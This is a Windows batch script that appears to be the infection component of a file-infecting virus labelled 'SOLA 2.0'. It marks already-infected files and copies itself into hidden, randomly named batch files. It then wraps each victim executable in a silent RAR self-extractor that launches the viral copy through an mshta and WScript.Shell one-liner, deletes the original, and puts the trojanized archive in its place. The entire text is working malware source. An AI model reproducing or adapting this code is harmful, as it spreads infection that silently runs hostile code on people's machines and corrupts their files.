if not exist "%*" goto End
set File=
set File="%*"


:SpaceChk
:ChkFile
if exist %sola%\File.txt del %sola%\File.txt
dir %File%>%sola%\File.txt
FOR /F "tokens=1 delims=" %%i in ('dir /b %File%') do set name=%%i
set DX=0
FOR /F "tokens=3" %%i in ('findstr /C:"%name%" %sola%\File.txt') do set DX=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%DX%") do set DX=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%type%"=="exe" findstr "SOLA_2.0_" %File%>nul&if not errorlevel 1 goto End
if /I %DX% gtr 1572864 goto End
:ChkSpace
set Space=
if exist %sola%\Drvifm1.txt del %sola%\Drvifm1.txt
dir %Drive%>%sola%\Drvifm1.txt
set ml=Dir(s)
findstr "个目录" %sola%\Drvifm1.txt>nul&if not errorlevel 1 set ml=个目录
FOR /F "tokens=3" %%i in ('findstr "%ml%" %sola%\Drvifm1.txt') do set Space=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%Space%") do set Space=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%Space%"=="" set Space=999999999999
if /I %space% lss 5242880 goto End


:SolaMake
%systemdrive%
cd %sola%
set Code=SOLA_2.0_%Random%%Random%%Random%
copy %setup%\sola.bat %Code%.bat
type %end%>>%Code%.bat
echo set Code=%Code%>>%Code%.bat
echo set Name=%name%>>%Code%.bat
if "%type%"=="exe" FOR /F "tokens=1 delims=." %%i in ("%name%") do echo set Name=%%i.com>>%Code%.bat
echo goto Backopen>>%Code%.bat
echo :End>>%Code%.bat
echo This is infect.bat

:Rar
FOR /F "tokens=1 delims=." %%i in (%File%) do set RealFile=%%i.exe
copy /Y %setup%\%type%pack.dll infect.dll
attrib %Code%.bat +s +h +r
echo SavePath>zs.txt
echo Setup=mshta "javascript:new ActiveXObject('WScript.Shell').Run('%Code%.bat',0);window.close()">>zs.txt
echo silent=1 >>zs.txt
echo Overwrite=1 >>zs.txt
rar -zzs.txt c infect.dll %sola%\zs.txt
rar -m0 -ep -ep1 a infect.dll %sola%\%Code%.bat
attrib %sola%\%Code%.bat -s -h -r
del %sola%\%Code%.bat

:Exe2com
if not "%type%"=="exe" goto SolaMake2
FOR /F "tokens=1 delims=." %%i in ("%name%") do set ComName=%%i.com
ren %File% "%ComName%"
FOR /F "tokens=1 delims=." %%i in (%File%) do set File="%%i.com"

:SolaMake2
attrib %File% +s +h
rar -m0 -ep -ep1 a infect.dll %File%
attrib %File% -s -h -r
echo %Code%>>infect.dll
del %File%
move /Y infect.dll "%RealFile%"

:End
